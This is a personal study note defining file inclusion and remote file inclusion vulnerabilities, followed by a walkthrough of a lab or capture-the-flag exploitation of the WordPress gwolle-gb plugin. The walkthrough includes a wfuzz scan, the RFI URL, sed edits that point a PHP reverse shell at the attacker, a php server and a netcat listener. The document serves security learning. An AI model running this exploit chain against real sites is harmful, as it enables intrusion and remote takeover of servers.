A **file inclusion vulnerability** is a type of [web](https://en.wikipedia.org/wiki/World_Wide_Web "World Wide Web") [vulnerability](https://en.wikipedia.org/wiki/Vulnerability_(computing) "Vulnerability (computing)") that is most commonly found to affect [web applications](https://en.wikipedia.org/wiki/Web_application "Web application") that rely on a scripting [run time](https://en.wikipedia.org/wiki/Run_time_(program_lifecycle_phase) "Run time (program lifecycle phase)"). This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. A file include vulnerability is distinct from a generic [directory traversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack"), in that directory traversal is a way of gaining unauthorized [file system](https://en.wikipedia.org/wiki/File_system "File system") access, and a file inclusion vulnerability subverts how an application loads code for execution. Successful exploitation of a file inclusion vulnerability will result in [remote code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution "Arbitrary code execution") on the [web server](https://en.wikipedia.org/wiki/Web_server "Web server") that runs the affected web application. An attacker can use remote code execution to create a [web shell](https://en.wikipedia.org/wiki/Web_shell "Web shell") on the web server, which can be used for [website defacement](https://en.wikipedia.org/wiki/Website_defacement "Website defacement").




!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


**Remote file inclusion** (**RFI**) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an [HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol "Hypertext Transfer Protocol") or [FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol "File Transfer Protocol") [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier "Uniform Resource Identifier") as a user-supplied parameter to the web application.

Now , for the explanation savitar is using wfuzz, watching a web server, which content there is on it. 

He is fuzzing manually , and focusing on the plugins


-c = (content)
-hc= (hide or ignore the 404 in this case)
-w (dictionary)
```
wfuzz -c --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

he was searching particulary one :
```
wp-content/plugins/gwolle-gb/
```

He find with metasploit some exploit of remote file inclusion.

with metasploit -x (path of the explit) we see that we can add files here:

http://[host]/wp-content/pluggins/gwolle-gb/frontend/capcha/ajaxresponse.php?abspath=http://[hackers_website]
host=victim
hackers_website=my php server


so in the "hackers website" we put our file. the file must be called "wp-load.php"

he downloaded a reverse shell code from pentest monkey and while he changes the IP and the port of the attack he used:
```
sed -i 's/127.0.0.1/10.10.14.15/' wp-load.php

sed -i 's/1234/443/' wp-load.php
```

so this changes the info without the use of "nano" or vim


he opened a server on php with
```
php -S 0.0.0.0:80
```
on the folder where is the file.



he is listening on the 443 with netcat and now on the browser he will go to the 

http://[host]/wp-content/pluggins/gwolle-gb/frontend/capcha/ajaxresponse.php?abspath=http://[hackers_website]


So, basically the attack consist of adding a malicious file on the host, and then execute commands from my own machine. In this case, the file was added to the plugins folder of wordpress.









